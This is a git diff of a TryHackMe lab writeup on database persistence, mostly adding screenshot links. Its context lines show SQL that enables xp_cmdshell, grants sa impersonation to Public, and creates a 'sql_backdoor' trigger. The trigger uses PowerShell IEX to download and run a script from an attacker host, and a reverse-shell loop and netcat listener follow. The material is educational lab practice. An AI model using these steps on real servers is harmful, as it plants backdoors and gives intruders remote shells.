@@ -74,11 +74,14 @@ PS C:\Users\Administrator> explorer.exe http://10.10.219.169/shell.aspx
 1. Started this room's machine
 2. Search for **Microsoft SQL Server Management Studio 18** and launch it
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Search.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt2.png)
 
 3. Launch and execute the following four queries:
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Launch%20pt.3.png)
+
 ```SQL
 sp_configure 'Show Advanced Options',1;
 RECONFIGURE;
@@ -89,7 +92,7 @@ RECONFIGURE;
 GO
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%201.png)
 
 ```SQL
 USE master
@@ -97,13 +100,13 @@ USE master
 GRANT IMPERSONATE ON LOGIN::sa to [Public];
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%202.png)
 
 ```SQL
 USE HRDB
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%203.png)
 
 ```SQL
 CREATE TRIGGER [sql_backdoor]
@@ -114,7 +117,7 @@ EXECUTE AS LOGIN = 'sa'
 EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://<ATTACK MACHINE IP>:8000/<POWERSHELL SCRIPT>.ps1'')"';
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Query%204.png)
 
 4. `mousepad <POWERSHELL SCRIPT>.ps1` and
 ```PowerShell
@@ -133,6 +136,9 @@ while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
 
 $client.Close()
 ```
+
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Creating%20evilscript.ps1.png)
+
 5. `nc -lvnp <PORT NUMBER>`
 ```Bash
 root@ip-10-10-32-42:~# nc -lvnp 9999
@@ -148,9 +154,9 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 C:\Users\Administrator>explorer.exe "http://10.10.138.69/"
 ```
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt1.png)
 
-![]()
+![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/MSSQL%20Insert%20Data%20pt2.png)
 
 ```Bash
 root@ip-10-10-32-42:~# nc -lvnp 9999
